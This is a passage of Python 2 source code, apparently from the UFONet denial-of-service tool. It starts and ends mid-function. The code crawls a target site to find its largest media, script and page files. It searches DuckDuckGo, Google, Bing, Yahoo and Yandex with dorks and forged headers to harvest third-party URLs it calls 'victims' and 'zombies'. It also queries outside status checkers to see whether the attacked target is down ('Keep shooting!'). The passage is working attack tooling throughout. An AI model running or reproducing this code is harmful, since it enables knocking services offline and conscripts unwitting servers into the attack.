            regex_mp31 = "<src='(.+?.mp3)'" # search on target's results using regex with simple quotation
            regex_mp3.append(regex_mp31)
            regex_mp32 = '<src="(.+?.mp3)"' # search on target's results using regex with double quotation
            regex_mp3.append(regex_mp32)
            #regex_mp33 = '<src=(.+?.mp3)' # search on target's results using regex without quotations
            #regex_mp3.append(regex_mp33)
            for regmp3 in regex_mp3:
                pattern_mp3 = re.compile(regmp3)
                mp3_links = re.findall(pattern_mp3, target_reply)
            mp3s = {}
            for mp3 in mp3_links:
                print('+Audio (.mp3) found: ' + mp3)
                try:
                    if mp3.startswith('http'):
                        mp3_file = urllib.urlopen(mp3)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        mp3_file = urllib.urlopen(target_url + mp3)
                    size = mp3_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(mp3_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Audio)')
                    size = 0
                mp3s[mp3] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print mp3s
            biggest_mp3 = max(mp3s.keys(), key=lambda x: mp3s[x]) # search/extract biggest audio (.mp3) value from dict
            biggest_files[biggest_mp3] = mp3s[biggest_mp3] # add biggest audio (.mp3) to list
        except: # if not any .mp3 found, go for next
            pass
        try: # search for .mp4 files
            regex_mp4 = []
            regex_mp41 = "<src='(.+?.mp4)'" # search on target's results using regex with simple quotation
            regex_mp4.append(regex_mp41)
            regex_mp42 = '<src="(.+?.mp4)"' # search on target's results using regex with double quotation
            regex_mp4.append(regex_mp42)
            #regex_mp43 = '<src=(.+?.mp4)' # search on target's results using regex without quotations
            #regex_mp4.append(regex_mp43)
            for regmp4 in regex_mp4:
                pattern_mp4 = re.compile(regmp4)
                mp4_links = re.findall(pattern_mp4, target_reply)
            mp4s = {}
            for mp4 in mp4_links:
                print('+Video (.mp4) found: ' + mp4)
                try:
                    if mp4.startswith('http'):
                        mp4_file = urllib.urlopen(mp4)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        mp4_file = urllib.urlopen(target_url + mp4)
                    size = mp4_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(mp4_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Video)')
                    size = 0
                mp4s[mp4] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print mp4s
            biggest_mp4 = max(mp4s.keys(), key=lambda x: mp4s[x]) # search/extract biggest video (.mp4) value from dict
            biggest_files[biggest_mp4] = mp4s[biggest_mp4] # add biggest video (.mp4) to list
        except: # if not any .mp4 found, go for next
            pass
        try: # search for .ogg files
            regex_ogg = []
            regex_ogg1 = "<src='(.+?.ogg)'" # search on target's results using regex with simple quotation
            regex_ogg.append(regex_ogg1)
            regex_ogg2 = '<src="(.+?.ogg)"' # search on target's results using regex with double quotation
            regex_ogg.append(regex_ogg2)
            #regex_ogg3 = '<src=(.+?.ogg)' # search on target's results using regex without quotations
            #regex_ogg.append(regex_ogg3)
            for regogg in regex_ogg:
                pattern_ogg = re.compile(regogg)
                ogg_links = re.findall(pattern_ogg, target_reply)
            oggs = {}
            for ogg in ogg_links:
                print('+Video (.ogg) found: ' + ogg)
                try:
                    if ogg.startswith('http'):
                        ogg_file = urllib.urlopen(ogg)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        ogg_file = urllib.urlopen(target_url + ogg)
                    size = ogg_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(ogg_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Video)')
                    size = 0
                oggs[ogg] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print oggs
            biggest_ogg = max(oggs.keys(), key=lambda x: oggs[x]) # search/extract biggest video (.ogg) value from dict
            biggest_files[biggest_ogg] = oggs[biggest_ogg] # add biggest video (.ogg) to list
        except: # if not any .ogg found, go for next
            pass
        try: # search for .ogv files
            regex_ogv = []
            regex_ogv1 = "<src='(.+?.ogv)'" # search on target's results using regex with simple quotation
            regex_ogv.append(regex_ogv1)
            regex_ogv2 = '<src="(.+?.ogv)"' # search on target's results using regex with double quotation
            regex_ogv.append(regex_ogv2)
            #regex_ogv3 = '<src=(.+?.ogv)' # search on target's results using regex without quotations
            #regex_ogv.append(regex_ogv3)
            for regogv in regex_ogv:
                pattern_ogv = re.compile(regogv)
                ogv_links = re.findall(pattern_ogv, target_reply)
            ogvs = {}
            for ogv in ogv_links:
                print('+Video (.ogv) found: ' + ogv)
                try:
                    if ogv.startswith('http'):
                        ogv_file = urllib.urlopen(ogv)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        ogv_file = urllib.urlopen(target_url + ogv)
                    size = ogv_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(ogv_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Video)')
                    size = 0
                ogvs[ogv] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print ogvs
            biggest_ogv = max(ogvs.keys(), key=lambda x: ogvs[x]) # search/extract biggest video (.ogv) value from dict
            biggest_files[biggest_ogv] = ogvs[biggest_ogv] # add biggest video (.ogv) to list
        except: # if not any .ogv found, go for next
            pass
        try: # search for .wmv files
            regex_wmv = []
            regex_wmv1 = "<src='(.+?.wmv)'" # search on target's results using regex with simple quotation
            regex_wmv.append(regex_wmv1)
            regex_wmv2 = '<src="(.+?.wmv)"' # search on target's results using regex with double quotation
            regex_wmv.append(regex_wmv2)
            #regex_wmv3 = '<src=(.+?.wmv)' # search on target's results using regex without quotations
            #regex_wmv.append(regex_wmv3)
            for regwmv in regex_wmv:
                pattern_wmv = re.compile(regwmv)
                wmv_links = re.findall(pattern_wmv, target_reply)
            wmvs = {}
            for wmv in wmv_links:
                print('+Video (.wmv) found: ' + wmv)
                try:
                    if wmv.startswith('http'):
                        wmv_file = urllib.urlopen(wmv)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        wmv_file = urllib.urlopen(target_url + wmv)
                    size = wmv_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(wmv_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Video)')
                    size = 0
                wmvs[wmv] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print wmvs
            biggest_wmv = max(wmvs.keys(), key=lambda x: wmvs[x]) # search/extract biggest video (.wmv) value from dict
            biggest_files[biggest_wmv] = wmvs[biggest_wmv] # add biggest video (.wmv) to list
        except: # if not any .wmv found, go for next
            pass
        try: # search for .css files
            regex_css = []
            regex_css1 = "href='(.+?.css[^']*)'" # search on target's results using regex with simple quotation
            regex_css.append(regex_css1)
            regex_css2 = 'href="(.+?.css[^"]*)"' # search on target's results using regex with double quotation
            regex_css.append(regex_css2)
            #regex_css3 = "href=(.+?.css[^']*)" # search on target's results using regex without quotations
            #regex_css.append(regex_css3)
            for regcss in regex_css:
                pattern_css = re.compile(regcss)
                css_links = re.findall(pattern_css, target_reply)
            csss = {}
            for css in css_links:
                print('+Style (.css) found: ' + css)
                try:
                    if css.startswith('http'):
                        css_file = urllib.urlopen(css)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        css_file = urllib.urlopen(target_url + css)
                    size = css_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(css_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Style)')
                    size = 0
                csss[css] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print csss
            biggest_css = max(csss.keys(), key=lambda x: csss[x]) # search/extract biggest style (.css) value from dict
            biggest_files[biggest_css] = csss[biggest_css] # add biggest style (.css) to list
        except: # if not any .css found, go for next
            pass
        try: # search for .js files
            regex_js = []
            regex_js1 = "src='(.+?.js[^']*)'" # search on target's results using regex with simple quotation
            regex_js.append(regex_js1)
            regex_js2 = 'src="(.+?.js[^"]*)"' # search on target's results using regex with double quotation
            regex_js.append(regex_js2)
            #regex_js3 = "src=(.+?.js[^']*)" # search on target's results using regex without quotations
            #regex_js.append(regex_js3)
            for regjs in regex_js:
                pattern_js = re.compile(regjs)
                js_links = re.findall(pattern_js, target_reply)
            jss = {}
            for js in js_links:
                print('+Script (.js) found: ' + js)
                try:
                    if js.startswith('http'):
                        js_file = urllib.urlopen(js)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        js_file = urllib.urlopen(target_url + js)
                    size = js_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(js_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Script)')
                    size = 0
                jss[js] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print jss
            biggest_js = max(jss.keys(), key=lambda x: jss[x]) # search/extract biggest script (.js) value from dict
            biggest_files[biggest_js] = jss[biggest_js] # add biggest script (.js) to list
        except: # if not any .js found, go for next
            pass
        try: # search for .xml files
            regex_xml = []
            regex_xml1 = "href='(.+?.xml)'" # search on target's results using regex with simple quotation
            regex_xml.append(regex_xml1)
            regex_xml2 = 'href="(.+?.xml)"' # search on target's results using regex with double quotation
            regex_xml.append(regex_xml2)
            #regex_xml3 = 'href=(.+?.xml)' # search on target's results using regex without quotations
            #regex_xml.append(regex_xml3)
            for regxml in regex_xml:
                pattern_xml = re.compile(regxml)
                xml_links = re.findall(pattern_xml, target_reply)
            xmls = {}
            for xml in xml_links:
                print('+Script (.xml) found: ' + xml)
                try:
                    if xml.startswith('http'):
                        xml_file = urllib.urlopen(xml)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        xml_file = urllib.urlopen(target_url + xml)
                    size = xml_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(xml_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Script)')
                    size = 0
                xmls[xml] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print xmls
            biggest_xml = max(xmls.keys(), key=lambda x: xmls[x]) # search/extract biggest script (.xml) value from dict
            biggest_files[biggest_xml] = xmls[biggest_xml]  # add biggest script (.xml) to list
        except: # if not any .xml found, go for next
            pass
        try: # search for .php files
            regex_php = []
            regex_php1 = "href='(.+?.php)'" # search on target's results using regex with simple quotation
            regex_php.append(regex_php1)
            regex_php2 = 'href="(.+?.php)"' # search on target's results using regex with double quotation
            regex_php.append(regex_php2)
            #regex_php3 = 'href=(.+?.php)' # search on target's results using regex without quotations
            #regex_php.append(regex_php3)
            for regphp in regex_php:
                pattern_php = re.compile(regphp)
                php_links = re.findall(pattern_php, target_reply)
            phps = {}
            for php in php_links:
                print('+Webpage (.php) found: ' + php)
                try:
                    if php.startswith('http'):
                        php_file = urllib.urlopen(php)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        php_file = urllib.urlopen(target_url + php)
                    size = php_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(php_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Webpage)')
                    size = 0
                phps[php] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print phps
            biggest_php = max(phps.keys(), key=lambda x: phps[x]) # search/extract biggest file (.php) value from dict
            biggest_files[biggest_php] = phps[biggest_php] # add biggest file (.php) to list
        except: # if not any .php found, go for next
            pass
        try: # search for .html files
            regex_html = []
            regex_html1 = "href='(.+?.html)'" # search on target's results using regex with simple quotation
            regex_html.append(regex_html1)
            regex_html2 = 'href="(.+?.html)"' # search on target's results using regex with double quotation
            regex_html.append(regex_html2)
            #regex_html3 = 'href=(.+?.html)' # search on target's results using regex without quotations
            #regex_html.append(regex_html3)
            for reghtml in regex_html:
                pattern_html = re.compile(reghtml)
                html_links = re.findall(pattern_html, target_reply)
            htmls = {}
            for html in html_links:
                print('+Webpage (.html) found: ' + html)
                try:
                    if html.startswith('http'):
                        html_file = urllib.urlopen(html)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        html_file = urllib.urlopen(target_url + html)
                    size = html_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(html_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Webpage)')
                    size = 0
                htmls[html] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print htmls
            biggest_html = max(htmls.keys(), key=lambda x: htmls[x]) # search/extract biggest file (.html) value from dict
            biggest_files[biggest_html] = htmls[biggest_html] # add biggest file (.html) to list
        except: # if not any .html found, go for next
            pass
        try: # search for .jsp files
            regex_jsp = []
            regex_jsp1 = "href='(.+?.jsp)'" # search on target's results using regex with simple quotation
            regex_jsp.append(regex_jsp1)
            regex_jsp2 = 'href="(.+?.jsp)"' # search on target's results using regex with double quotation
            regex_jsp.append(regex_jsp2)
            #regex_jsp3 = 'href=(.+?.jsp)' # search on target's results using regex without quotations
            #regex_jsp.append(regex_jsp3)
            for regjsp in regex_jsp:
                pattern_jsp = re.compile(regjsp)
                jsp_links = re.findall(pattern_jsp, target_reply)
            jsps = {}
            for jsp in jsp_links:
                print('+Webpage (.jsp) found: ' + jsp)
                try:
                    if jsp.startswith('http'):
                        jsp_file = urllib.urlopen(jsp)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        jsp_file = urllib.urlopen(target_url + jsp)
                    size = jsp_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(jsp_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Webpage)')
                    size = 0
                jsps[jsp] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print jsps
            biggest_jsp = max(jsps.keys(), key=lambda x: jsps[x]) # search/extract biggest file (.jsp) value from dict
            biggest_files[biggest_jsp] = jsps[biggest_jsp] # add biggest file (.jsp) to list
        except: # if not any .jsp found, go for next
            pass
        try: # search for .asp files
            regex_asp = []
            regex_asp1 = "href='(.+?.asp)'" # search on target's results using regex with simple quotation
            regex_asp.append(regex_asp1)
            regex_asp2 = 'href="(.+?.asp)"' # search on target's results using regex with double quotation
            regex_asp.append(regex_asp2)
            #regex_asp3 = 'href=(.+?.asp)' # search on target's results using regex without quotations
            #regex_asp.append(regex_asp3)
            for regasp in regex_asp:
                pattern_asp = re.compile(regasp)
                asp_links = re.findall(pattern_asp, target_reply)
            asps = {}
            for asp in asp_links:
                print('+Webpage (.asp) found: ' + asp)
                try:
                    if asp.startswith('http'):
                        asp_file = urllib.urlopen(asp)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        asp_file = urllib.urlopen(target_url + asp)
                    size = asp_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(asp_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Webpage)')
                    size = 0
                asps[asp] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            #print asps
            biggest_asp = max(asps.keys(), key=lambda x: asps[x]) # search/extract biggest file (.asp) value from dict
            biggest_files[biggest_asp] = asps[biggest_asp] # add biggest file (.asp) to list
        except: # if not any .asp found, go for next
            pass
        try: # search for .txt files
            regex_txt = []
            regex_txt1 = "href='(.+?.txt)'" # search on target's results using regex with simple quotation
            regex_txt.append(regex_txt1)
            regex_txt2 = 'href="(.+?.txt)"' # search on target's results using regex with double quotation
            regex_txt.append(regex_txt2)
            #regex_txt3 = 'href=(.+?.txt)' # search on target's results using regex without quotations
            #regex_txt.append(regex_txt3)
            for regtxt in regex_txt:
                pattern_txt = re.compile(regtxt)
                txt_links = re.findall(pattern_txt, target_reply)
            txts = {}
            for txt in txt_links:
                print('+File (.txt) found: ' + txt)
                try:
                    if txt.startswith('http'):
                        txt_file = urllib.urlopen(txt)
                    else:
                        target_host = urlparse(options.inspect)
                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
                        if not target_url.endswith('/'): # add "/" to end of target
                            target_url = target_url + "/"
                        txt_file = urllib.urlopen(target_url + txt)
                    size = txt_file.headers.get("content-length")
                    if size is None: # grab data with len if content-lenght is not available on headers
                        size = len(txt_file.read())
                except: 
                    print('[Error] - Unable to retrieve info from Webpage)')
                    size = 0
                txts[txt] = int(size)
                print('(Size: ' + str(size) + ' Bytes)')
                print '-'*12
            biggest_txt = max(txts.keys(), key=lambda x: txts[x]) # search/extract biggest file (.txt) value from dict
            biggest_files[biggest_txt] = txts[biggest_txt] # add biggest file (.txt) to list
        except: # if not any .txt found, go for next
            pass
        print '='*80
        if(biggest_files=={}):
            print "\nNo link found on target\n\n"
            print '='*80 + '\n'
            return #sys.exit(2)
        biggest_file_on_target = max(biggest_files.keys(), key=lambda x: biggest_files[x]) # search/extract biggest file value from dict
        if biggest_file_on_target.startswith('http'):
            print ('=Biggest File: ' + biggest_file_on_target)
        else:
            target_host = urlparse(options.inspect)
            target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
            if not target_url.endswith('/'): # add "/" to end of target
                target_url = target_url + "/"
            print ('=Biggest File: ' + target_url + biggest_file_on_target)
        print '='*80 + '\n'

    def extract_dorks(self):
        # extract dorks from file (ex: 'dorks.txt')
        try:
            f = open('dorks.txt')
            dorks = f.readlines()
            dorks = [ dork.replace('\n','') for dork in dorks ]
            f.close()
            if not dorks:
                print "\n[Error] - Imposible to retrieve 'dorks' from file.\n"
                return
            else:
                return dorks
        except:
            if os.path.exists('dorks.txt') == True:
                print '[Error] - Cannot open:', 'dorks.txt', "\n"
                return #sys.exit(2)
            else:
                print '[Error] - Cannot found:', 'dorks.txt', "\n"
                return #sys.exit(2)

    def search_zombies(self, dork):
        # crawlering on search engine results to extract zombies
        options = self.options
        zombies = []

        if not options.engine or options.engine == 'duck': # using duck by default [07/10/2015: OK!]
            url = 'https://duckduckgo.com/html/?'
            if options.search: # search from query
                q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks: # search from a dork
                q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
            start = 0 # set index number of first entry
            query_string = { 'q':q, 's':start }
            data = urllib.urlencode(query_string)
            url = url + data
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print("Query used: " + url + "\n")
            try:
                req = urllib2.Request(url, None, headers)
                req_reply = urllib2.urlopen(req).read()
            except:
                print('[Error] - Unable to connect to duck\n')
                if options.allengines:
                    return
                if not options.dorks:
                    if not self.options.forceyes:
                        update_reply = raw_input("Wanna try a different search engine (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print "\nSearch engines available:"
                    print '-'*25
                    for e in self.search_engines:
                        print "+ "+e
                    print '-'*25
                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'duck'"
                    return #sys.exit(2)
                else:
                    req_reply = ''
            regex = '<a rel="nofollow" class="large" href="(.+?)"' # regex magics
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)

        elif options.engine == 'google': # google [07/10/2015: OK!]
            url = 'https://www.google.com/xhtml?'
            if options.search: # search from query
                q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks: # search from a dork
                q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
            start = 0 # set index number of first entry
            if options.num_results: # set number of results to search
                try:
                    num = int(options.num_results)
                except:
                    print("You should specify an integer!!!. Using default value: 10\n")
                    num = 10
            else:
                num = 10 
            gws_rd = 'ssl' # set SSL as default
            query_string = { 'q':q, 'start':start, 'num':num, 'gws_rd':gws_rd }
            data = urllib.urlencode(query_string)
            url = url + data
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print("Query used: " + url + "\n")
            try:
                req = urllib2.Request(url, None, headers)
                req_reply = urllib2.urlopen(req).read()
            except: 
                print('[Error] - Unable to connect to google\n')
                if options.allengines:
                    return
                if not options.dorks:
                    if not self.options.forceyes:
                        update_reply = raw_input("Wanna try a different search engine (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print "\nSearch engines available:"
                    print '-'*25
                    for e in self.search_engines:
                        print "+ "+e
                    print '-'*25
                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
                    return #sys.exit(2)
                else:
                    req_reply = ''
            regex = '<h3 class="r"><a href="/url(.+?)">' # regex magics
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)

        elif options.engine == 'bing': # bing [07/10/2015: OK!]    
            url = 'https://www.bing.com/search?'
            if options.search: # search from query
                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks: # search from a dork
                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
            start = 0 # set index number of first entry
            query_string = { 'q':q, 'first':start }
            data = urllib.urlencode(query_string)
            url = url + data
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print("Query used: " + url + "\n")
            try:
                req = urllib2.Request(url, None, headers)
                req_reply = urllib2.urlopen(req).read()
            except:
                print('[Error] - Unable to connect to bing\n')
                if options.allengines:
                    return
                if not options.dorks:
                    if not self.options.forceyes:
                        update_reply = raw_input("Wanna try a different search engine (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print "\nSearch engines available:"
                    print '-'*25
                    for e in self.search_engines:
                        print "+ "+e
                    print '-'*25
                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'"
                    return #sys.exit(2)
                else:
                    req_reply = ''
            regex = '<li class="b_algo"><h2><a href="(.+?)">' # regex magics
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)

        elif options.engine == 'yahoo': # yahoo [07/10/2015: OK!]
            url = 'https://search.yahoo.com/search?'
            if options.search: # search from query
                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks: # search from a dork
                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
            start = 0 # set index number of first entry
            query_string = { 'p':q, 'b':start }
            data = urllib.urlencode(query_string)
            url = url + data
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print("Query used: " + url + "\n")
            try:
                req = urllib2.Request(url, None, headers)
                req_reply = urllib2.urlopen(req).read()
            except:
                print('[Error] - Unable to connect to yahoo\n')
                if options.allengines:
                    return
                if not options.dorks:
                    if not self.options.forceyes:
                        update_reply = raw_input("Wanna try a different search engine (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print "\nSearch engines available:"
                    print '-'*25
                    for e in self.search_engines:
                        print "+ "+e
                    print '-'*25
                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'duck'"
                    return #sys.exit(2)
                else:
                    req_reply = ''
            regex = '<h3 class="title"><a class=" ac-algo ac-21th" href="(.+?)">' # regex magics
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)

        elif options.engine == 'yandex': # yandex [07/10/2015: OK!]
            url = 'https://yandex.ru/search/?'
            if options.search: # search from query
                q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks: # search from a dork
                q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
            start = 0 # set index number of first entry
            query_string = { 'text':q, 'p':start }
            data = urllib.urlencode(query_string)
            url = url + data
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print("Query used: " + url + "\n")
            try:
                req = urllib2.Request(url, None, headers)
                req_reply = urllib2.urlopen(req).read()
            except:
                print('[Error] - Unable to connect to yandex\n')
                if options.allengines:
                    return
                if not options.dorks:
                    if not self.options.forceyes:
                        update_reply = raw_input("Wanna try a different search engine (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print "\nSearch engines available:"
                    print '-'*25
                    for e in self.search_engines:
                        print "+ "+e
                    print '-'*25
                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'duck'"
                    return #sys.exit(2)
                else:
                    req_reply = ''
            regex = '<a class="link link_cropped_no serp-item__title-link" target="_blank" href="(.+?)"' # regex magics
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)

        else: # no valid search engine
            print('[Error] - This search engine is not supported!\n')
            if not options.dorks:
                if not self.options.forceyes:
                    update_reply = raw_input("Wanna try a different search engine (Y/n)")
                else:
                    update_reply = "Y"
                if update_reply == "n" or update_reply == "N":
                    return #sys.exit(2)
                print "\nSearch engines available:"
                print '-'*25
                for e in self.search_engines:
                    print "+ "+e
                print '-'*25
                print "\nEx: ufonet -s 'proxy.php?url=' --se 'duck'"
                return #sys.exit(2)
            else:
                req_reply = ''

        if options.num_results: # set number of results to search
            try:
                num = int(options.num_results)
            except:
                print("You should specify an integer!!!. Using default value: 10\n")
                num = 10
        else:
            num = 10
        total_results = 1
        for url in url_links: # general parse on urls
            if int(num) < int(total_results):
                break
            total_results = total_results + 1 # results counter
            url_link = url.strip('?q=') # parse url_links to retrieve only a url
            url_link = urllib.unquote(url_link).decode('utf8') # unquote encoding
            if options.search:
                sep = str(options.search)
            if options.dorks:
                sep = str(dork)
            url_link = url_link.rsplit(sep, 1)[0] + sep
            if url_link not in zombies: # parse possible repetitions
                print('+Victim found: ' + url_link)
                print '-'*12
                zombies.append(url_link)
            else:
                pass

        if len(zombies) == 0: # print dorking results
            print "[Info] - Not any possible victim(s) found for this query!"
            if not options.dorks:
                if not self.options.forceyes:
                    return #sys.exit(2)
        print '\n' + '='*22
        print('+Possible Zombies: ' + str(len(zombies)))
        self.total_possible_zombies = self.total_possible_zombies + len(zombies)
        print '='*22 + '\n'
        if options.dorks:
            print '-'*44 + '\n'
        return zombies

    def check_nat(self):
        # check for NAT configuration
        options = self.options
        from urllib import urlopen
        tor_reply = urllib2.urlopen("https://check.torproject.org").read() # check if TOR is enabled
        your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip()
        if not tor_reply or 'Congratulations' not in tor_reply:
            print("[Info] It seems that you are not using TOR to recieve data. Good!\n")
        else:
            print("[Error] You are using TOR as public IP... It's not possible to NAT!\n")
            sys.exit(2) # exit
        try:
            data = str(urlopen('http://checkip.dyndns.com/').read()) # check for public ip
            self.pub_ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
        except:
            try: # another check for public ip
                data = str(urlopen('http://whatismyip.org/').read())
                self.pub_ip = re.compile(r'">(\d+\.\d+\.\d+\.\d+)</span>').search(data).group(1)
            except:
                print("[Error] Something wrong checking your public IP using an external service. Try it again!\n")
                sys.exit(2) # exit
        print " + Public: " + self.pub_ip + "\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 0))  # connecting to a UDP address doesn't send packets (black magic)
        self.local_ip = s.getsockname()[0]
        print " + Local: " + self.local_ip + "\n"
        print '='*22 + '\n'

    def check_is_up(self, target):
        # extract external status checkers, perform a request and check results
        options = self.options
        num_is_up = 0 # counter for 'up' reports
        num_is_down = 0 # counter for 'down' reports
        print "\n[Info] Flying some UCAV with 'heat-beam' weapons...\n"
        shuffle(self.check_engines) # suffle check_engines order
        for check_engine in self.check_engines:
            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
            if target.startswith("http://"): # parse target for some checkers
                target = target.replace('http://','')
            elif target.startswith("https://"):
                target = target.replace('https://','')
            url = check_engine + target
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            try:
                if options.verbose:
                    print("[Info] Sniping: " + url)
                req = urllib2.Request(url, None, headers)
                req_reply = urllib2.urlopen(req).read()
                if not "is down" or not "looks down" in req_reply: # parse external service for reply
                    print "[Info] UCAV: " + check_engine + " -> HIT! || Report: ONLINE! [Keep shooting!]"
                    num_is_up = num_is_up + 1 
                else:
                    print "[Info] UCAV: " + check_engine + " -> FAILED? || Report: Target looks OFFLINE from here!!! ;-)"
                    num_is_down = num_is_down + 1
